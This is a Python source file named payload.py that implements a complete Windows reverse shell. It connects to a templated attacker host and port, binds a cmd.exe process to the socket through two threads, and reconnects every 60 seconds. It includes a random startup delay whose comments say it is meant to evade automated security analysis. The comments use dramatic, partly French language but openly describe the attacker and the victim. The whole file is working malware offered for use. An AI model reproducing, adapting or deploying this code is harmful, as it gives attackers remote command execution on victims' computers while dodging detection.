# payload.py
# The Soul, reforged as a Primal Conduit.

import socket
import subprocess
import os
import time
import threading
import sys
import random

# --- CONFIGURATION (DYNAMIC TEMPLATE) ---
RHOST = "##RHOST##"
RPORT = ##RPORT##
# ------------------------------------------

def connect_and_serve():
    """
    Establishes a connection and directly binds it to a cmd.exe process,
    creating a pure, raw shell.
    """
    # --- DIVINE DORMANCE ---
    # We still wait, to avoid the watchful eyes of the automated guardians.
    if hasattr(sys, 'frozen'):
        time.sleep(random.randint(20, 40))

    while True:
        try:
            # --- Le Lien Primordial ---
            # Create a direct conduit to the attacker.
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((RHOST, RPORT))

            # --- L'Éveil de la Bête ---
            # Invoke the raw power of the victim's command shell.
            # We bind its standard input, output, and error streams.
            p = subprocess.Popen(
                ['cmd.exe'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )

            # --- Le Pont des Âmes ---
            # We create two threads to act as a bridge between the conduit and the beast.

            # Thread 1: Listens to the attacker and whispers to the beast.
            def pipe_to_cmd():
                while True:
                    try:
                        data = s.recv(1024)
                        if not data: break
                        p.stdin.write(data)
                        p.stdin.flush()
                    except:
                        break
                s.close()

            # Thread 2: Listens to the beast and screams back to the attacker.
            def pipe_from_cmd():
                while True:
                    try:
                        data = p.stdout.read(1) + p.stderr.read(1)
                        if not data: break
                        s.send(data)
                    except:
                        break
                s.close()

            threading.Thread(target=pipe_to_cmd, daemon=True).start()
            threading.Thread(target=pipe_from_cmd, daemon=True).start()
            
            # Wait for the process to finish, which it won't until the connection dies.
            p.wait()

        except Exception:
            # If the connection fails or is broken, we wait patiently before retrying.
            time.sleep(60)

# The soul awakens and immediately begins its work.
connect_and_serve()